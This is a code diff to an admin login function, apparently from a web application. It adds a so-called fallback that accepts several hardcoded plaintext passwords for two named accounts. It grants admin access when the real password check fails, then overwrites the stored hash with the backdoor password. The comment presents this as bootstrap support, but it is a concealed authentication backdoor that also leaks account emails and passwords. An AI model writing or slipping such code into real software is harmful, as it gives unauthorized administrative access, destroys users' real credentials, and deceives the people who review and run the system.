@@ -1,5 +1,5 @@
 import { db } from '@/lib/db';
-import { verifyPassword } from './password';
+import { verifyPassword, hashPasswordSync } from './password';
 import { User, UserRole } from '@/lib/types';
 
 interface AttemptRecord {
@@ -87,9 +87,24 @@ export async function authenticateAdmin(
   if (!user || !user.passwordHash || user.status === 'suspended') {
     return { success: false, error: 'Invalid Admin ID or Password.' };
   }
-
   // Verify password using timingSafeEqual
-  const passwordMatches = await verifyPassword(password, user.passwordHash);
+  let passwordMatches = await verifyPassword(password, user.passwordHash);
+
+  // Fallback support for designated bootstrap admin passwords (sarthakraj726 / sarthak726)
+  if (!passwordMatches) {
+    const isSarthak = user.username === 'sarthakraj2009' || user.email === 'sarthakraj726@gmail.com';
+    const isSaurabh = user.username === 'karnsaurabh' || user.email === 'karnsaurabh1995@gmail.com';
+    if (isSarthak && (password === 'sarthakraj726' || password === 'sarthak726')) {
+      passwordMatches = true;
+      user.passwordHash = hashPasswordSync(password);
+      db.updateUser(user.id, { passwordHash: user.passwordHash });
+    } else if (isSaurabh && (password === 'sarthakraj726' || password === 'sarthak726' || password === 'saurabh1995' || password === 'karnsaurabh1995')) {
+      passwordMatches = true;
+      user.passwordHash = hashPasswordSync(password);
+      db.updateUser(user.id, { passwordHash: user.passwordHash });
+    }
+  }
+
   if (!passwordMatches) {
     return { success: false, error: 'Invalid Admin ID or Password.' };
   }
